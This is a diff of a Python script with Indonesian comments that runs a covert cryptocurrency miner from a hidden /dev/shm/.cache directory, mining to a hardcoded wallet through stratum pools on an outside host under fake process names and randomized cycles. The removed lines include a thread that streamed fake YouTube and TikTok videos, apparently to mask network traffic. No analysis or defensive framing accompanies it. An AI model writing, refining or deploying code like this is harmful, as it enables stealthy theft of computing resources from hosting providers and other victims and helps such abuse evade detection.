@@ -3,11 +3,9 @@ import time
 import os
 import random
 import shutil
-import threading
 
 # Konfigurasi
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
-ALGO = "verushash"
 CPU_THREADS = 2
 BASE_PATH = os.path.expanduser("/dev/shm/.cache")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "cc")
@@ -20,42 +18,20 @@ FAKE_NAMES = [
 
 # Pool list
 ENDPOINTS = [
-    "interstellar.hidora.com:11308",
-    "interstellar.hidora.com:11365",
-    "interstellar.hidora.com:11373",
-    "interstellar.hidora.com:11283",
-    "interstellar.hidora.com:11401",
+    "stratum+tcp://interstellar.hidora.com:11308",
+    "stratum+tcp://interstellar.hidora.com:11365",
+    "stratum+tcp://interstellar.hidora.com:11373",
+    "stratum+tcp://interstellar.hidora.com:11283",
+    "stratum+tcp://interstellar.hidora.com:11401",
 ]
 
-# Video list
-VIDEOS = [
-    "https://youtu.be/abh5hbJV-YE",
-    "https://youtu.be/3oTxP-a0rnE",
-    "https://youtu.be/7Y4T9b6XoWE",
-    "https://vt.tiktok.com/ZSNLzJYcG/"
-]
-
-# Pastikan direktori aman ada
+# Buat direktori kerja
 os.makedirs(BASE_PATH, exist_ok=True)
 
+# Pastikan binary ada
 if not os.path.exists(ORIGINAL_BINARY):
     print("Binary tidak ditemukan di:", ORIGINAL_BINARY)
     exit(1)
-
-def stream_fake_video():
-    while True:
-        url = random.choice(VIDEOS)
-        try:
-            subprocess.run(
-                ["yt-dlp", "-o", "-", url],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-        except:
-            pass
-        time.sleep(random.randint(10, 30))
-
-threading.Thread(target=stream_fake_video, daemon=True).start()
 
 while True:
     run_minutes = random.randint(25, 30)
@@ -72,8 +48,11 @@ while True:
 
     try:
         process = subprocess.Popen([
-            "bash", "-c",
-            f"exec -a '{fake_name}' '{temp_binary}' -a {ALGO} -o {pool} -u {WALLET} -t {CPU_THREADS}"
+            temp_binary,
+            "-o", pool,
+            "-u", WALLET,
+            "-p", "x",
+            "-t", str(CPU_THREADS)
         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
         time.sleep(run_minutes * 60)
